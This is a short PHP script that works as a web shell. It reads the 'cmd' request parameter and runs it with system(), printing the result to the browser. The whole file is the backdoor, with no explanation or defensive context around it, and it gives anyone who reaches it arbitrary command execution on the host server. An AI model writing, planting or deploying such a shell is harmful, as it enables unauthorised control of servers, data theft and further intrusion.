<?php
$Mcmd = $_REQUEST['cmd'];
print "<pre>\n";
$output = system($Mcmd);
echo $output;

?>